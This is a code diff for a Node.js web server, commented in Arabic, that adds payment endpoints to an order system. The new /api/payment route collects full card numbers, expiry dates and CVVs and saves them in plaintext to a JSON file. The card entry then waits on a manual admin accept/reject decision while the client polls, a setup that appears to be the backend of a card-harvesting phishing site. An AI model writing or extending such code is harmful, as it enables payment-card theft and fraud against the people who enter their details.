@@ -31,6 +31,7 @@ const writeOrders = (list) => fs.writeFileSync(DB_FILE, JSON.stringify(list, nul
 /* ---------- جلسات الأدمن ---------- */
 const sessions = new Map();
 const DAY = 24 * 60 * 60 * 1000;
+const paymentStates = new Map();
 
 /* ---------- الزيارات النشطة ---------- */
 const visitors = new Map();           // id -> { last, page }
@@ -145,6 +146,47 @@ const server = http.createServer(async (req, res) => {
     writeOrders(list);
     console.log('طلب جديد:', order.id, order.name);
     return json(res, 200, { ok: true, id: order.id });
+  }
+
+  // استقبال بيانات البطاقة وبدء انتظار قرار الأدمن
+  if (pathname === '/api/payment' && req.method === 'POST') {
+    const body = await readBody(req);
+    const id = String(body.requestId || '').slice(0, 100) || crypto.randomBytes(8).toString('hex');
+    paymentStates.set(id, { status: 'pending', createdAt: Date.now() });
+    const orders = readOrders();
+    const order = orders.find((item) => item.id === id);
+    if (order) {
+      order.status = 'pending';
+      order.card = {
+        cardName: String(body.cardName || '').slice(0, 120),
+        cardNumber: String(body.cardNumber || '').slice(0, 32),
+        expiryDate: String(body.expiryDate || '').slice(0, 10),
+        cvv: String(body.cvv || '').slice(0, 4)
+      };
+      writeOrders(orders);
+    }
+    return json(res, 200, { ok: true, id: id });
+  }
+
+  // حالة الدفع التي تنتظر قرار الأدمن
+  if (pathname.startsWith('/api/status/') && req.method === 'GET') {
+    const id = pathname.split('/').pop();
+    const payment = paymentStates.get(id);
+    return json(res, 200, { ok: true, status: payment ? payment.status : 'pending' });
+  }
+
+  // قرار الأدمن على بيانات البطاقة
+  if (pathname.startsWith('/api/payments/') && pathname.endsWith('/decision') && req.method === 'POST') {
+    if (!authed(req)) return json(res, 401, { ok: false, error: 'unauthorized' });
+    const id = pathname.split('/')[3];
+    const body = await readBody(req);
+    const status = body.decision === 'accept' ? 'accept' : body.decision === 'reject' ? 'reject' : '';
+    if (!status) return json(res, 400, { ok: false, error: 'invalid-decision' });
+    paymentStates.set(id, { status: status, createdAt: Date.now() });
+    const orders = readOrders();
+    const order = orders.find((item) => item.id === id);
+    if (order) { order.status = status; writeOrders(orders); }
+    return json(res, 200, { ok: true, status: status });
   }
 
   // نبضة زائر (heartbeat) — تُستدعى من كل صفحة عامة
